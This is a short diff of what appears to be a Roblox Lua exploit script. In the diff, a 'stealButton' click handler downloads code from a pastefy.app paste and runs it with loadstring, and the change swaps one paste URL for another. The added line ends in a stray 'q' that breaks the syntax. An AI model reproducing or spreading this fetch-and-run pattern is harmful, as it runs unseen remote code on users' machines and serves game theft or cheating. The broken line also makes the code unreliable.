@@ -48,7 +48,7 @@ stealButton.Parent = frame
 -- Button Function
 stealButton.MouseButton1Click:Connect(function()
     local success, result = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/i0Vl9spw/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/PyDMKQfb/raw"))()q
     end)
     if not success then
         warn("Failed to execute script: ", result)
